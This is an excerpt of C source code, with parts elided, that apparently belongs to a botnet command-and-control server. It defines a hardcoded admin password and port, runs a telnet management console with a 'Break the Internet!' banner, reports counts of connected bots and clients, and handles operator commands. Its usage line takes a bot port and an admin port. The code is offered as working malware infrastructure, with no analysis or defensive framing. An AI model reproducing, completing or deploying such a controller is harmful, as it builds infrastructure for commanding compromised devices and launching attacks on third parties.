...
#define MY_MGM_PASS "1p42o91Er0"
#define MY_MGM_PORT 100
...
void *titleWriter(int thefd) // just an informational banner
{
        char string[2048];
        memset(string, 0, 2048);
        sprintf(string, "Bots connected: %d | Clients connected: %d\r\n: ", clientsConnected(), managesConnected);
...
void *telnetWorker(void *arguments)
{
        ...
        memset(buf, 0, 2048);
        pthread_create(&title, NULL, &titleWriter, thefd); /* writes the informational banner to the admin after a login */
        if(send(thefd, "=========================================\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "===============Break the=================\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "===============Internet!=================\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
        ...
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
                ...
                //send(thefd, buf, 50, MSG_NOSIGNAL);
                send(thefd, ": ", 2, MSG_NOSIGNAL);
                if(strncmp(buf, "! COUNT", 7) == 0){
                    char stringg[2048];
                    memset(stringg, 0, 2048);
                    sprintf(stringg, "Bots connected: %d | Clients connected: %d\r\n: ", clientsConnected(), managesConnected);
                    send(thefd, stringg, strlen(stringg), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    continue;
                } 
                FILE *logFile;
...
int main(int argc, char *argv[])
{
        ...
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [bot port] [threads] [admin port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
